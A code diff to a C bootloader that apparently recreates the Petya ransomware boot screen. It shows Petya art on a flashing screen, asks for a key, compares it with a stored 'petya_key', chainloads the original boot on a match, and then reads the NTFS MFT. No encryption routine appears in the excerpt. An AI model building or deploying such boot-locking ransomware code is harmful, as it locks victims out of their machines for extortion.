@@ -265,12 +265,14 @@ void bootloader_main(uint32_t boot_drive)
         vga_set_color(flag == 0 ? COLOR_WHITE_ON_BLACK : COLOR_WHITE_ON_RED);
         flag = flag == 0 ? 1 : 0;
 
-        vga_draw_centered_ascii("NiHaHaHaHa!\n(Press any key to resume)");
+        //vga_draw_centered_ascii("NiHaHaHaHa!\n(Press any key to resume)");
+        vga_puts(PETYA_ART);
 
         if (keyboard_hashkey())
             break;
 
-        for (int i = 0; i < 200000; i++);
+        //for (int i = 0; i < 1000000; i++);
+        sleep(100);
     }
 
     vga_clear();
@@ -293,11 +295,16 @@ void bootloader_main(uint32_t boot_drive)
         if (strcmp(key, petya_key) == 0)
         {
             vga_puts("YES!");
-            break;
+            
+            for (volatile int i = 0; i < 3000000; i++);
+
+            vga_clear();
+
+            vga_set_color(COLOR_WHITE_ON_BLACK);
+            do_chainload();
         }
 
-        vga_puts("GO AWAY!\n");
-        vga_puts('\n');
+        vga_puts("GO AWAY!\n\n");
     }
 
     ntfs_read_mft(2048);
